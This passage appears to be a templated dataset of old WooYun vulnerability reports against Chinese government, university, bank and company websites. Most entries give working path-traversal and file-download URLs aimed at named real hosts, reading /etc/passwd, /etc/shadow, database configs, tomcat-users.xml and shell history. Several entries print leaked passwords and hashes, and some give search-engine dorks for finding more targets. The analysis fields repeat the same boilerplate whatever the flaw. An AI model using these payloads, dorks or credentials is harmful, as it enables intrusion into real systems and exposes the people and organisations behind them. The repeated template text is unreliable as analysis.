**厂商**: 重庆邮电大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://tsg.cqupt.edu.cn/software_download/sw_download.php?sw_url=http://tsg.cqupt.edu.cn/software_download/sw_download.php?sw_url=./sw_download.php

**POC**: http://tsg.cqupt.edu.cn/software_download/sw_download.php?sw_url=../inc/config.php可被下载，包含数据库连接信息

**绕过**: 直接利用

**修复**: 调整服务器设置
---

---
### [wooyun-2013-035403] 新网互联某站任意文件下载可得到passwd等文件
**厂商**: 北京新网互联科技有限公司 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点：http://119.254.72.50/得到passwd文件：http://119.254.72.50/index.php?doAction=00010001&Step=../../../../../../../../../../etc/passwd%00.jpgdns的文件，resolv.conf,可以看到他们企业的dns：http://119.254.72.50/index.php?doAction=00010001&Step=../../../../../../../../../../etc/resolv.conf%00.jpg/etc/sysconfig/autofs文件：http://119.254.72.50/index.php?doAction=00010001&Step=../../../../../../../../../../etc/sysconfig/auto

**POC**: 想看啥自己指定

**绕过**: 直接利用

**修复**: 过滤违法参数
---

---
### [wooyun-2014-089020] PHPAPP注入第十三枚（无视过滤）
**厂商**: PHPAPP | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在wooyun上看到了有人提了PHPAPP的漏洞： http://wooyun.org/bugs/wooyun-2010-055604，然后去官网看了看，前几天刚有更新，就在官网下了PHPAPP最新的v2.6来看看(2014-12-11更新的)。PSOT注入点：wwww.xxx.com/member.php?action=1&app=42&cid=85&rid=973, 存在漏洞的文件在/phpapp/apps/rights/member_phpapp.php下面分析一下漏洞产生的原因第一处绕过：先看看是如何得到$_POST中的内容的，$this->POST=$this->POSTArray();如果key的最后一个字母是’_s’时，用户的输入会经过str方法的防注处理。而如果key（参数）的最后一个字母不是’_s’，则可以功能绕过过滤！第二处绕过:if($this->cid>0){$ge

**POC**: 见 详细说明

**绕过**: 过滤绕过

**修复**: 完善dataTypeConvert方法
---

---
### [wooyun-2012-08087] 某省公安厅某站点任意文件下载
**厂商**: 某省公安厅 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接：http://xxgk.fjgat.gov.cn/download.jsp?path=UserFiles/File/%A1%B6%B8%A3%BD%A8%CA%A1%B9%AB%B0%B2%CC%FC%B9%D8%D3%DA%D3%A1%B7%A2%A1%B4%B8%A3%BD%A8%CA%A1%B9%AB%B0%B2%CC%FC%D5%FE%B8%AE%D0%C5%CF%A2%B9%AB%BF%AA%B9%A4%D7%F7%D4%DD%D0%D0%B9%E6%B6%A8%A1%B5%B5%C4%CD%A8%D6%AA%A1%B7%B5%C4%B8%BD%BC%FE20080530044951.doc其中文件下载路径参数path没有对路径进行必要的限制！

**POC**: http://xxgk.fjgat.gov.cn/download.jsp?path=download.jsphttp://xxgk.fjgat.gov.cn/download.jsp?path=admin/login.jsp.........and so on!

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2015-093591] UCweb某站点目录遍历致敏感配置信息泄漏
**厂商**: UC Mobile | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目录遍历位于：http://mfw.uc.cn/download/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/home/jws/.bash_history非root，可读取较大量的敏感配置信息。

**POC**: 比较有价值的用户：jws:x:501:501::/home/jws:/bin/bash.bash_history泄漏了很多信息：/home/jws/local/logman/crontab/.rsync_passmhBds7ZtoxSJhttp://mfw.uc.cn/download/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//home/jws/app

**绕过**: 直接利用

**修复**: 修复目录遍历漏洞
---

---
### [wooyun-2014-080641] 宜信某分站任意文件下载
**厂商**: 宜信 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 获取用户：http://xinyi.creditease.cn/ajax.do?action=download&file=../../../../../../../../../../etc/passwd用户执行命令：xinyi.creditease.cn/ajax.do?action=download&file=../../../../../../../../../..//home/xinyi/.bash_history后台：http://xinyi.creditease.cn/webadmin/login.jsp

**POC**: tomcat 用户密码保持的地方：http://xinyi.creditease.cn/ajax.do?action=download&file=../../../../../../../../../../app/tomcat-xinyi/conf/tomcat-users.xml数据库账号密码：http://xinyi.creditease.cn/ajax.do?action=download&file=../../../../../../../../../../app/tomcat-xinyi/data/xinyi/WEB-INF/classes/jdbc.properties

**绕过**: 直接利用

**修复**: 对路径过滤../
---

---
### [wooyun-2015-0116270] 某通用网站集群系统两处任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前人案例：http://wooyun.org/bugs/wooyun-2010-062518漏洞地址：/cms/web/jspdownload.jsp?FileUrl=c:%5Cwindows%5Cwin.ini/public/jspdownload.jsp?FileFullPath=c:%5Cwindows%5Cwin.ini&FileName=win.ini案例：http://www.gxhzedu.net/fsmcmshttp://www.hzfgw.gov.cn/fsmcms/http://www.gxhzjw.gov.cn/fsmcms/http://www.cnfia.cn/fsmcms/http://www.btgaj.gov.cn/fsmcms/

**POC**: http://www.gxhzedu.net/fsmcms/cms/web/jspdownload.jsp?FileUrl=c:%5Cwindows%5Cwin.inihttp://www.gxhzedu.net/fsmcms/public/jspdownload.jsp?FileFullPath=c:%5Cwindows%5Cwin.ini&FileName=win.inihttp://www.hzfgw.gov.cn/fsmcms/cms/web/jspdownload.jsp?FileUrl=c:%5Cwindows%5Cwin.inihttp://www.hzfgw.gov.cn/fs

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2014-073429] 大汉cms任意文件下载漏洞
**厂商**: 南京大汉网络有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: /columncount/tem/downfile.jsp文件下载代码，没有任何过滤：<%//原文件名String strFileName = Convert.getParameter(request,"filename");//要保存的文件名String  downloadname = Convert.getParameter(request,"savename");downloadname = java.net.URLEncoder.encode( downloadname,"UTF-8");pageContext.getOut().clear();if(!DownFile.getFile(strFileName,downloadname,response,"UTF-8")){

**POC**: 截图：验证的几个网站：金华http://www.jinhua.gov.cn/vc/vc/columncount/tem/downfile.jsp?filename=/etc/passwd&savename=down.txt湖州http://www.huzhou.gov.cn/vc/vc/columncount/tem/downfile.jsp?filename=/etc/passwd&savename=down.txt中国建筑http://jcms.cscec.com/vc/vc/columncount/tem/downfile.jsp?filename=/etc/passwd&savenam

**绕过**: 直接利用

**修复**: 文件名过滤。
---

---
### [wooyun-2014-083979] 酷派某站目录遍历(可下载大量敏感信息,若干数据库配置信息泄露)
**厂商**: yulong.com | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://61.141.236.11/下载了源码看了下，包含了好几个站的源码，有bbs、designer等。我随便找了2个站的源码下载了下。然后就是各种的config文件的信息啊！试了试远程连接，没连上，算了，不继续深入了。

**POC**: http://61.141.236.11/

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2011-02327] 南方航空分站目录遍历
**厂商**: 中国南方航空 | **年份**: 2011 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://ec.csair.com/ 具体我不说了，从头遍历到脚，基本都可以下载，麻烦快点找到南航的相应负责人吧

**POC**: 每个目录打开看看吧

**绕过**: 直接利用

**修复**: 把目录遍历关掉，做好容器安全性设定
---

---
### [wooyun-2013-028878] 赛迪网大小网站源码全部泄露
**厂商**: 赛迪网 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址（目录遍历了）http://media.ccidedu.com/http://dl.ccidnet.com/FTP匿名登陆ftp://115.182.21.17/rk/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: -_-!
---

---
### [wooyun-2012-08432] 中国学位与研究生教育信息网致命漏洞
**厂商**: 中国学位与研究生教育信息网 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞标题:中国学位与研究生教育信息网任意文件下载漏洞

**POC**: http://www.chinadegrees.cn/webrms/Services/Download.jsp?path=/../../../../../../../../etc/passwd&fileName=1.txt

**绕过**: 直接利用

**修复**: 你可以直接删除这个文件，或者代码重写(查询数据库的id号对应的文件下载地址来下载。)
---

---
### [wooyun-2012-07760] sogou map及其多个子应用任意文件读取
**厂商**: 搜狗 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先附带一些敏感信息暴露及目录遍历等小问题：http://map.sogou.com/lushu/swf/.svn/entrieshttp://map.sogou.com/shouji/.svn/entrieshttp://map.sogou.com/lushu/swf/http://map.sogou.com/lushu/swf/upload.swf

**POC**: 首先，读取主应用web.xml文件，导致大结构暴露：http://map.sogou.com/WEB-INF/web.xml<?xml version="1.0" encoding="GB2312" ?>- <web-app>- <context-param><param-name>ClassLibUrl</param-name><param-value>http://lib.go2map.com/cl</param-value><description>引用类库地址</description></context-param>- <context-param><param-name>Defau

**绕过**: 直接利用

**修复**: 好歹也是个搜索引擎，安全方面多重视一下啊！
---

---
### [wooyun-2013-026586] 黑龙江省地震局任意文件读取造成敏感信息泄露
**厂商**: 黑龙江省地震局 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.hea.gov.cn/manage/content/docmanage/previewImg1.jsp?filePath=/../..//../..//../..//../..//../..//etc/shadow%00.jpghttp://www.hea.gov.cn/manage/content/docmanage/download.jsp?filePath=/../..//../..//../..//../..//../..//etc/shadowhttp://www.hea.gov.cn/manage/index/login.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 虽然厂商不如存在，但是有关部门的管理员还是相当流弊的，相信你们是最棒的。
---

---
### [wooyun-2014-054653] 浙江大学某网站文件遍历及弱口令
**厂商**: 浙江大学 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://zdjc.zju.edu.cn/system/webos/login.htm 弱口令 admin  admin888http://zdjc.zju.edu.cn/system/user/    目录遍历 没有权限验证

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 改密码配置iis服务器
---

---
### [wooyun-2013-028179] 人人某站服务器任意文件读取
**厂商**: 人人网 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1，问题出在http://123.125.38.79:8080resin服务器。2，可读取任意文件，泄露密码等重要信息。http://123.125.38.79:8080/resin-doc/examples/security-basic/viewfile?file=WEB-INF/password.xmlhttp://123.125.38.79:8080/resin-doc/examples/ioc-periodictask/viewfile?file=index.xtphttp://123.125.38.79:8080/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/web.xmlhttp://123.125.38.79:8080/resin-doc/examples/ioc-periodictask/viewfile

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 安全意识啊！！有礼物么-，-
---

---
### [wooyun-2014-073831] 河北省通信管理局任意文件下载漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://121.28.83.66:8080/zfba/stdownload.jsp?path=uploadFile/file5e8082408319.doc看个文件，发现path变量没做任何审查就去读取文件了http://121.28.83.66:8080/zfba/stdownload.jsp?path=stdownload.jsp求个邀请码http://121.28.83.66:8080的tomcat配置也是够懒的。。。

**POC**: stdownload.jsp源码<%@ page language="java" contentType="text/html; charset=GBK" pageEncoding="GBK"%><%@page import="com.jspsmart.upload.SmartUpload"%><%@ taglib prefix="c"  uri="http://java.sun.com/jsp/jstl/core"  %><html><head><meta http-equiv="Content-Type" content="text/html; charset=GBK"><title>In

**绕过**: 直接利用

**修复**: 审查PATH变量，或者通过文件资源映射的方式
---

---
### [wooyun-2015-0121692] 某市教育局网站信息泄漏
**厂商**: CCERT教育网应急响应组 | **年份**: 2015 | **类型**: 网络敏感信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 网络敏感信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络敏感信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.sy.e21.edu.cn/upload_files/报考信息大量泄漏admin    admin

**POC**: (见原文)

**绕过**: 直接利用

**修复**: i don't know
---

---
### [wooyun-2015-0141356] 篱笆网某站phpmyadmin未授权访问root权限任意文件读取
**厂商**: 篱笆网 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://data.liba.com/phpmyadmin/http://data.liba.com/pma/user将/etc/passwd写入表即可读取

**POC**: http://data.liba.com/phpmyadmin/http://data.liba.com/pma/user将/etc/passwd写入表即可读取

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2013-020191] 茂业百货供应商服务平台任意文件下载
**厂商**: 茂业百货 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: just see this：http://www.moyscm.com/scm/download.jsp?filename=..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2fetc%2fpasswdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:

**POC**: ：http://www.moyscm.com/scm/download.jsp?filename=..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2fetc%2fpasswdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nolo

**绕过**: 直接利用

**修复**: you know。
---

---
### [wooyun-2015-092487] 某大学分站存在任意文件下载漏洞
**厂商**: 吉林大学珠海分校 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在漏洞的网址：http://jzx.jluzh.com/kygood/downfile.asp?filename=../conn.asp成功下载了。。。不过网站有waf。。深入不下去= =

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-094972] 99个职业学院/中小学/大学/教育局等等机构有网站备份文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 认证接口

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.swjtu.com/0.zip	1	天佑斋 -  西南交通大学论坛 - 竢实扬华,自强不息 - swjtu.comhttp://www.wsxx120.com/web.rar	2	四川成都卫生学校http://www.lyjsxy.net/lyjsxy.tar.gz	2	龙岩技师学院--国家重点全日制公办技师学院-主页http://www.zhongmeijy.com/zhongmeijycom.sql	2	氧气呼吸器,自动苏生器,化学氧自救器,过滤式自救器,乳化液泵站,压风自救装置-山东中煤矿用救援装备分公司 - 山东中煤矿用救援装备分公司http://www.med66.com/med66.tar.gz	2	医学教育网：中国超大型国家医学考试网站！http://www.bdqnzongbu.com/bdqnzongbu.sql	2	郑州北大青鸟_河南计算机培训学校

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0102298] 某cms数据库文件下载
**厂商**: 苏州捷成网络科技 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 部分案例http://www.szchunyi.com/http://www.szghzdh.com/http://www.astjdgc.com/!@%23$1234/!@%23$1234.mdbhttp://www.szhylaw.com/http://www.baiyuejiaju99.comhttp://www.goszjj.com/http://www.szlfs.net/http://www.skxdq.com/http://www.xcim.cn/http://www.xuandeoil.com/http://www.youyazx.com/http://www.zhudizhuangshi.com/http://www.qiangzheng.net/http://www.wjmingde.com/http://www.xinlibrush.com/http://www.yu

**POC**: http://www.szchunyi.com/!@%23$1234/!@%23$1234.mdbuserID	userName	userPwd	realName1	admin	48b140a1b15bc551	吃不消8	webadmin	49ba59abbe56e057	1http://www.astjdgc.com/!@%23$1234/!@%23$1234.mdb

**绕过**: 直接利用

**修复**: 文件策略
---

---
### [wooyun-2014-054809] 大汉网络JCMS任意文件下载
**厂商**: 南京大汉网络有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过分析代码，某个下载功能没有限制权限，没有限制下载类型，通过设置绝对路径的参数，直接下载。漏洞利用：jcms\m_1_9\user\down.jsp?abspathfile=/etc/passwd

**POC**: 测试代码：http://www.njgl.gov.cn/jcms/m_1_9/user/down.jsp?abspathfile=/etc/passwd鼓楼区政府门户网站：下载文件内容：

**绕过**: 直接利用

**修复**: 1.限制访问权限；2.限制下载路径和文件类型；
---

---
### [wooyun-2015-0123137] 世纪东方某分站存在任意文件下载
**厂商**: 成都世纪东方 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题存在于http://help.51web.com/download页面当我们尝试http://help.51.com/download/../../../etc/passwd 的时候，失败了于是尝试 http://help.51web.com/download/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwdOK!httpd.conf还有php.ini 等等....就不继续深入了.........

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 分站的安全也应该注意.....顺便问一下...为什么邮件服务下线了.....不然我就继续内网了>.....
---

---
### [wooyun-2013-033675] 友宝自动贩卖机多处高危漏洞导致主控端+内部权限泄漏
**厂商**: 友宝在线 | **年份**: 2013 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目测主站是没什么搞的，没有发现可利用的地方。然后对主站的c段进行扫描，发现了下列几个web系统http://service.uboxol.com/login/login   客服后台http://211.151.164.47/seeyon/index.jsp   OA系统http://211.151.164.78/index.php   仙人掌http://211.151.164.62/  站台app官网 目测又是一约炮神器http://neirong.uboxol.com/index.php   友乐汇后台http://vms.uboxol.com/ubox-vms/login.do  后台管理系统（核心系统）大致看一下，弱口令没得，嘛也找不到，放弃正面攻击。回到vms后台管理系统，发现版权后面有一个故障管理的链接，点进去http://124.127.89.53:8080/zentao/

**POC**: 有账号密码了怎么搞，当然是登陆最有可能有内部信息的地方，邮箱。挑了一些账号测试，发现几乎有一小半的账号密码能直接登陆邮箱，下面贴出一部分获得的信息，仅作为证明危害。data.uboxol.com:8001组织:domID:admin密码:admin望账号：xa_songmengen期望账号密码:woaibaobao您的VMS后台账号已经建立。用户名： suyi密  码:  sy@2012账号zongjiajun 密码ubox1369新VMS后台访问地址：http://vms.uboxol.com:9080/ubox-vmsmengyan2012 mengyan2012mengyan邮箱 my4

**绕过**: 直接利用

**修复**: 测试过程中收集的数据已经全部销毁，不过，还是让员工统一改一次密码吧。对整个系统进行一次安全评估，乌云众测是个不错的方式。
---

---
### [wooyun-2014-081502] 某市卫生和计划生育局任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 舟山市卫生和计划生育局存在任意文件下载漏洞http://www.zswsj.gov.cn:8080/system/FunPages/DownloadFile.jsp?filePath=/system/FunPages/DownloadFile.jsp&name=DownloadFile.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制跨目录
---

---
### [wooyun-2015-0131166] 当当某站一系列设计缺陷导致后台沦陷
**厂商**: 当当网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: doogua.dangdang.com登录爆破破解导出所有后台用户名+密码目录遍历

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0150444] 乐语客服系统任意文件下载漏洞
**厂商**: 多友科技（北京）有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 部分客户使用的乐语客服系统存在任意下载漏洞，

**POC**: 关键词：inurl:/p.do?c=  客服案例：国都证券http://im.guodu.com:9090/live/down.jsp?file=../../../../../../../../../../../../../../../../etc/passwd上海农商银行http://service.srcb.com:8080/live/down.jsp?file=../../../../../../../../../../../../../../../../etc/passwd广汽丰田http://cr.gac-toyota.com.cn:8099/live/down.jsp?file=.

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0102379] 多省地震局通用任意文件下载漏洞
**厂商**: 国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天提交了个湖南省地震局的任意文件下载，深入研究发现存在多省地震局都存在该通用任意文件下载漏洞谷歌或者百度搜索inurl:manage/content/docmanage结果还是不少下面提供5个案例中国地震局地震预测研究所http://www.seis.ac.cn/manage/content/docmanage/download.jsp?filePath=/../../../../etc/shadow宁夏地震局http://www.nx.earthquake.cn/manage/content/docmanage/download.jsp?filePath=/../../../../etc/shadow黑龙江地震信息网http://www.eq-hl.com/manage/content/docmanage/download.jsp?filePath=/../../../../etc/s

**POC**: 如上

**绕过**: 直接利用

**修复**: 控制权限
---

---
### [wooyun-2014-062978] 某通用型政务服务类CMS任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 出现文件任意下载漏洞的cms 来自：北京大地在线科技发展有限公司 开发的政务审批系统。如何证明的？看www.tsfnzw.gov.cn/site/down/ 的foot 得到的结果，通过下载源码确认是同一套系统。先看几个实例：www.qaxzfw.gov.cn/site/down/downloadfile.jsp?name=web.xml&path=/WEB-INF/直接就把web.xml下载回来了：下载index.jsp:http://www.qaxzfw.gov.cn/site/down/downloadfile.jsp?name=index.jsp&path=/site/down/google hack:site:gov.cn inurl:downloadfile.jsp name path

**POC**: 列出几个受影响的网站：http://www.nhxzfw.gov.cn:81/site/downloadfile.jsp?name=web.xml&path=/WEB-INF/xzfw.jinshan.gov.cn/site/services/downloadfile.jsp?name=web.xml&path=/WEB-INF/www.wuyixz.gov.cn/site/down/downloadfile.jsp?name=web.xml&path=/WEB-INF/www.tsfnzw.gov.cn/site/down/downloadfile.jsp?name=web.xml&path

**绕过**: 直接利用

**修复**: 控制path，只允许指定目录。
---

---
### [wooyun-2015-0104719] 杭州电子科技大学门户系统任意文件下载可重置密码
**厂商**: 杭州电子科技大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://cas.hdu.edu.cn/cas/pwd/http://cas.hdu.edu.cn/cas/i/http://cas.hdu.edu.cn/cas/j/http://cas.hdu.edu.cn/cas/c/http://cas.hdu.edu.cn/cas/manager/

**POC**: 以下是下载到的通过邮箱重置密码的源码，可以构造参数重置密码。

**绕过**: 直接利用

**修复**: 你懂的。
---

---
### [wooyun-2012-05946] 齐博cms整站系统v7后台目录遍历及文件删除漏洞
**厂商**: 齐博cms整站系统 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 程序未对用户提交的$down_path参数进行任何过滤，导致用户可以遍历程序目录。在hack/attachment/admin.php第36行elseif($job=="list"&&$Apower[attachment_list]){!$page&&$page=1;$rows=40;$min=($page-1)*$rows;$down_path || $down_path=$webdb[updir];$up_path=preg_replace("/(.*)\/([^\/]+)/is","\\1",$down_path);$thispath=ROOT_PATH.$down_path;//直接将$down_path带入get_file()$file_db=get_file($down_path);

**POC**: 在hack/attachment/admin.php第36行elseif($job=="list"&&$Apower[attachment_list]){!$page&&$page=1;$rows=40;$min=($page-1)*$rows;$down_path || $down_path=$webdb[updir];$up_path=preg_replace("/(.*)\/([^\/]+)/is","\\1",$down_path);$thispath=ROOT_PATH.$down_path;//直接将$down_path带入get_file()$file_db=get_file($

**绕过**: 直接利用

**修复**: 过滤$down_path变量。。
---

---
